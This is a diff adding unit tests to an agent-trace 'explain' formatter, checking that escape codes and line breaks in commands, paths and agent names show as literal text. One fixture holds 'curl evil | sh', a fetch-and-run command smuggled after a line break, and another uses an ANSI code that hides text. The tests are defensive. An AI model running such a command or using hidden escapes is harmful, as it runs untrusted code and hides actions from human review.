@@ -14,6 +14,11 @@ from agent_trace.explain import (
 from agent_trace.models import EventType, SessionMeta, TraceEvent
 from agent_trace.store import TraceStore
 
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
+
 
 def _make_event(event_type: EventType, ts: float, session_id: str = "s1", **data) -> TraceEvent:
     return TraceEvent(event_type=event_type, timestamp=ts, session_id=session_id, data=data)
@@ -224,6 +229,61 @@ class TestExplainSubagents(unittest.TestCase):
         plain = self.render(self.events(attributed=False))
         self.assertNotIn("Subagent:", plain)
         self.assertEqual(attributed.replace("  Subagent: default 00000011  1 tools\n", ""), plain)
+
+
+def _result(**phase):
+    fields = dict(name="plain", index=1, start_offset=0, end_offset=1)
+    fields.update(phase)
+    return ExplainResult(session_id="s1", total_duration=1.0, total_events=1,
+                         phases=[Phase(**fields)], total_retries=0, wasted_seconds=0)
+
+
+def _render(result):
+    buf = io.StringIO()
+    format_explain(result, out=buf)
+    return buf.getvalue()
+
+
+def _bash(command="plain", **data):
+    return _make_event(EventType.TOOL_CALL, 0.0, tool_name="Bash",
+                       arguments={"command": command}, **data)
+
+
+# (label, kind, build): build(value) returns a report with value in the place
+# the label names. The kinds are in tests/_escapes.py.
+FORMAT_EXPLAIN_CASES = [
+    ("phase name", "free", lambda v: _result(name=v)),
+    ("Read", "text", lambda v: _result(files_read=["plain", v])),
+    ("Wrote", "text", lambda v: _result(files_written=["plain", v])),
+    ("Ran", "text", lambda v: _result(commands=[v])),
+    ("Subagent agent_type", "text",
+     lambda v: _result(events=[_bash(agent_id="plain", agent_type=v)])),
+    ("Subagent agent_id", "short", lambda v: _result(events=[_bash(agent_id=v)])),
+]
+
+
+class TestTraceTextShowsAsText(unittest.TestCase):
+    """A command, a path or a prompt in a trace can hold escape codes and
+    line breaks. explain shows them as text."""
+
+    def test_each_value_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, FORMAT_EXPLAIN_CASES, _render)
+
+    def test_plain_text_prints_unchanged(self):
+        _escapes.check_plain_text_unchanged(self, FORMAT_EXPLAIN_CASES, _render)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        events = [_bash("echo safe\ncurl evil | sh")]
+        output = _render(ExplainResult(
+            session_id="s1", total_duration=1.0, total_events=1,
+            phases=build_phases(events, base_ts=0.0), total_retries=0, wasted_seconds=0,
+        ))
+        self.assertIn("  Ran: echo safe\\ncurl evil | sh\n", output)
+
+    def test_sgr_code_shows_as_text(self):
+        output = _render(_result(commands=["a\x1b[8mhidden"]))
+        self.assertIn(r"Ran: a\x1b[8mhidden", output)
+        self.assertNotIn("\x1b", output)
 
 
 if __name__ == "__main__":
